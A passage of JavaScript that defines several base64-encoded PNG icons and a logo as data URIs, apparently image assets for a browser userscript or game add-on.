    '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';

var no_ambrosia_icon_png = 'data:image/png;base64,'+
    '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';

var premium_png = 'data:image/png;base64,'+
    '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';

var zoferos_logo_png = 'data:image/png;base64,'+
    'iVBORw0KGgoAAAANSUhEUgAAAMgAAABkCAYAAADDhn8LAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB50RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTNS4xqx9I6wAA'+
    'ABZ0RVh0Q3JlYXRpb24gVGltZQAwNi8xNi8xMQsapeEAACAASURBVHiczLx3kKRbWt75e8/5XPrM8tVl2nff7r5z7cw1c8dqHDCGgRmMQBIsK7OrXVjFLiGzJkRI2gh2AQVGEWJhQALEaglihRFaRmMY'+
    '0DhmruP67tu2qru6TFZVevOZc979o66I2A0FurQ0Ac8/mRH5ZX6Z73mf87rnpKgqbwb6+U/DpUvIYRe/1UZdgRybxzSbuMIhSQl54Rnk1FkYj9HOAeI9GlgEwfkAH5YJmyG89hpcuoSrr1LcuEOwVMYs'+
    'z8H1m0ilDM0Z9MoryDTF3fcAndIKlViJy+6Pv4/c+Br6yu9jdAQ2hUoXXBv1ghBBYNHSLLL6TWwNP8rc4QHmREGY7sOrl6HegNV1/MlTyI1rEAaA4OIq2pon3LqG9gfo2nHk7l042EGClMGmIVh/hKDV'+
    'J8gOkIMuGsVIEqJ5jm/MIjbA7LfRQQ8EpBTjGnP4xUsEe68h0xG6twdBiL//EYgj7J2bUBQogowHaOEgDJGFZfSwDXmOlMpQq0GjBb0O2jlEozJy6iQiBt27S3Z7H809SVVwx09DrYa5c5Oil+KbFzGH'+
    'LxKYHF+qQ7OJmz+DS4VkcA3yDG8rmLwNr28y6V4ibK1jTlzGP3yecKMNdzbh8ABdW6JIq2i3jm8qSaODf/UWurCMXV9C97aR0ShUp8I0U2nVNasuiviTKpWhuq/scLByQcZVkROTkXej542NPT6qa/jg'+
    'iupggjloQ+cQ4kAwIVp4yfKSaukEZjEVW6/q6FoNe/CcRK4jafmYhmZAns2Szp/Wimyqbtdkx86akx+U7E05+v8P9kd+5Efe1IXFC9eRyEIcQRJgKDDVKtqYgbtbyNZtWFhAt3Zg0IckADGICY8eixwp'+
